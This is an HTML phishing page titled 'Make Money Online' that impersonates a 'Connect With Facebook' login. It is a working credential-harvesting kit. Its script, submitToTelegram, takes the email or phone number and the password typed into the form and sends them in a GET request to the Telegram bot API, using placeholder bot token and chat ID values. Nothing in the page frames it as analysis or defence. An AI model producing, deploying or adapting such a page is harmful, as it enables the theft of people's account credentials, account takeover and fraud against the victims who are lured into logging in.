<!DOCTYPE html>
<html lang="en">
<head>
  <title>MAKE MONEY ONLINE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #ECF0F3;
      font-family: Arial, sans-serif;
    }

    .login_box {
      background: #ECF0F3;
      width: 380px;
      height: auto;
      position: relative;
      margin: 0 auto;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }

    .title {
      color: #499DF5;
      font-size: 24px;
      text-align: center;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: calc(100% - 40px);
      height: 40px;
      margin-bottom: 20px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-size: 14px;
    }

    button {
      background: #499DF5;
      color: #fff;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      padding: 10px 20px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #3578E5;
    }

    .no_acc {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }

    .sign_up {
      color: #499DF5;
      text-decoration: none;
    }

    .sign_up:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login_box">
    <h1 class="title">Make Money Online</h1>
    <form id="loginForm">
      <input type="text" id="email" name="email" placeholder="Email address or phone number" required><br>
      <input type="password" id="password" name="password" placeholder="Password" required><br>
      <button type="button" onclick="submitToTelegram()">Connect With Facebook</button>
    </form>
    <p class="no_acc">Again Connect With Facebook? <a class="sign_up" href="login.html">Connect</a></p>
  </div>

  <script>
    function submitToTelegram() {
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      var botToken = 'YOUR_BOT_TOKEN';
      var chatId = 'YOUR_CHAT_ID';
      var message = "New login attempt:\nEmail: " + email + "\nPassword: " + password;

      var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

      var xhr = new XMLHttpRequest();
      xhr.open("GET", telegramUrl, true);
      xhr.send();

      xhr.onreadystatechange = function () {
        if (xhr.readyState == XMLHttpRequest.DONE) {
          console.log(xhr.responseText);
          // Optionally, handle the response here
        }
      };
    }
  </script>
</body>
</html>
